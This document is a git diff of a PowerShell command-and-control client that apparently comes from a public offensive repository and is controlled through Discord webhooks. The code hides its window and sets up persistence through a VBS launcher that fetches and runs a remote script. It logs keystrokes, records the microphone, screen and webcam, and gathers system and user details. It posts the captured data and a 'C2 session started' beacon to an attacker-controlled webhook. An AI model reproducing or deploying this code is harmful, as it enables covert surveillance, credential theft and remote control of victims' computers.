@@ -33,6 +33,9 @@ Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and re
 # $hookurl = "YOUR_WEBHOOK_URL" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
 # $GHurl = "YOUR_FILE_URL"  # eg. https://pastebin.com/raw/QtCxxxx
 
+# Shortened webhook detection
+if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
+
 # HIDE THE WINDOW - Change to 1 to hide the console window
 $HideWindow = 1
 If ($HideWindow -gt 0){
@@ -63,7 +66,7 @@ Write-Output "Persistance Installed - Checking Version.."
         $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$hookurl='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
 "@
         $tobat | Out-File -FilePath $VBpath -Force
         sleep 1
@@ -77,14 +80,32 @@ if(Test-Path "C:\Windows\Tasks\service.vbs"){
     rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
 
-$version = "1.7.0" # Current Version
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $response = Invoke-RestMethod -Uri $GHurl
 $previouscmd = $response
 
 $noraw = $ghurl -replace "/raw", ""
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``Enter Commands Here`` - $noraw :link:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
+$jsonPayload = @{
+    tts        = $false
+    embeds     = @(
+        @{
+            title       = "$env:COMPUTERNAME | C2 session started!"
+            description = "Enter Commands Here - $noraw"
+            color       = 16711680
+            author      = @{
+                name     = "egieb"
+                url      = "https://github.com/beigeworm"
+                icon_url = "https://i.ibb.co/vJh2LDp/img.png"
+            }
+            footer      = @{
+                text = "$timestamp"
+            }
+        }
+    )
+}
+$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
+Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'
 
 Function Options{
 $msgsys = "``========================================================
@@ -324,19 +345,16 @@ while ($true) {
 
 Function RecordAudio{
 param ([int[]]$t)
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
-$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
-iwr -Uri $url -OutFile $Path
+    GetFfmpeg
 }
 sleep 1
-
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
 function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
 $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
-
 $mp3Path = "$env:Temp\AudioClip.mp3"
 if ($t.Length -eq 0){$t = 10}
 .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
@@ -347,14 +365,13 @@ rm -Path $mp3Path -Force
 
 Function RecordScreen{
 param ([int[]]$t)
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
-$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
-iwr -Uri $url -OutFile $Path
+    GetFfmpeg
 }
-sleep 1
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+
 $mkvPath = "$env:Temp\ScreenClip.mkv"
 if ($t.Length -eq 0){$t = 10}
 .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
@@ -449,7 +466,7 @@ Remove-Item -Path $zipFilePath -Force
 
 Function SystemInfo{
 $userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
-$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches ;$email = ("$email").Trim()
+$email = (Get-ComputerInfo).WindowsRegisteredOwner
 $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
@@ -577,12 +594,10 @@ if (-not (Test-Path -Path $outputFolder)) {
 if (-not (Test-Path -Path $tempFolder)) {
     New-Item -ItemType Directory -Path $tempFolder | Out-Null
 }
-$ffmpegDownload = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
-$ffmpegZip = "$tempFolder\ffmpeg-release-essentials.zip"
-if (-not (Test-Path -Path $ffmpegZip)) {
-    I`wr -Uri $ffmpegDownload -OutFile $ffmpegZip
+$Path = "$env:Temp\ffmpeg.exe"
+If (!(Test-Path $Path)){  
+GetFfmpeg
 }
-Expand-Archive -Path $ffmpegZip -DestinationPath $tempFolder -Force
 $videoDevice = $null
 $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Image' } | Select-Object -First 1
 if (-not $videoDevice) {
@@ -593,9 +608,7 @@ if (-not $videoDevice) {
 }
 if ($videoDevice) {
     $videoInput = $videoDevice.Name
-    $ffmpegVersion = Get-ChildItem -Path $tempFolder -Filter "ffmpeg-*-essentials_build" | Select-Object -ExpandProperty Name
-    $ffmpegVersion = $ffmpegVersion -replace 'ffmpeg-(\d+\.\d+)-.*', '$1'
-    $ffmpegPath = Join-Path -Path $tempFolder -ChildPath ("ffmpeg-{0}-essentials_build\bin\ffmpeg.exe" -f $ffmpegVersion)
+    $ffmpegPath = "$env:Temp\ffmpeg.exe"
     & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
 } else {
 }
@@ -660,11 +673,12 @@ While ($true){
         $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
         Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
         $previouscmd = $response
-        return
+        break
         }
     }
     finally{
-        If ($keyPressed -and $messages -notcontains "kill") {
+        $messages = Invoke-RestMethod -Uri $GHurl
+        If (($keyPressed) -and (!($messages -match "kill"))) {
             $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
             $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keys Captured :`` $escmsgsys"} | ConvertTo-Json
             Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
@@ -677,6 +691,24 @@ Start-Sleep -Milliseconds 10
 }
 }
 
+Function GetFfmpeg{
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Downloading FFmpeg to Client..`` :mag_right:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+$Path = "$env:Temp\ffmpeg.exe"
+    If (!(Test-Path $Path)){  
+        $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.0-essentials_build.zip'
+        $tempDir = "$env:temp"
+        $zipFilePath = Join-Path $tempDir 'ffmpeg-6.0-essentials_build.zip'
+        $extractedDir = Join-Path $tempDir 'ffmpeg-6.0-essentials_build'
+        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
+        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
+        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
+        Remove-Item -Path $zipFilePath -Force
+        Remove-Item -Path $extractedDir -Recurse -Force
+    }
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Download Complete`` :white_check_mark:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
 
 while($true){
     $response = Invoke-RestMethod -Uri $GHurl
